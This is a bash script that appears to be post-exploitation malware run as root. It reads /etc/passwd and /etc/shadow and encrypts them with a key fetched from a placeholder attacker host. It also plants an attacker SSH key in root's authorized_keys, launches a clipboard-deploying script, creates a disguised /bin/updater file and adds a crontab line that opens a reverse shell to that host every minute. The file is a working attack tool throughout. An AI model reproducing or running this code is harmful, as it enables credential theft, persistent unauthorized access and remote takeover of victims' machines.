#!/bin/bash
path=$1

cd $path

pass=$(cat /etc/passwd)
shad=$(cat /etc/shadow)
# pass="asdasd"
# shad="asdasd"

if [ "$EUID" -ne 0 ]
  then echo "Not root, exiting"
  exit
fi

# fetch password from server
curl "http://<REPLACE_IP>:10000/key" > $path/key.txt


data="$pass '\n\n###Shadow ###\n\n' $shad"
echo -e $data > $path/data.txt

encrypted=$(openssl enc -aes-256-cbc -salt -in $path/data.txt -pass file:$path/key.txt)

echo test: $encrypted

# check for python or python3
if command -v python3 &> /dev/null
then
    python3 $path/analyser.py > test.txt
else
    python $path/analyser.py > test.txt
fi
# echo -e $link > $path/link.txt
# echo -e $link
# cleanup

touch /bin/updater


# SSH keys
mkdir -p /root/.ssh
chmod 700 /root/.ssh
touch /root/.ssh/authorized_keys
curl "http://<REPLACE_IP>:10000/ssh-key" |tr -d '"' >> /root/.ssh/authorized_keys

# deploy clipboard script
chmod +x $path/deploy_clipboard.sh
./deploy_clipboard.sh



echo "* * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/<REPLACE_IP>/9001 0>&1'" >> /etc/crontab
chmod +x /bin/updater # forgot to do this

# rm -rf $path



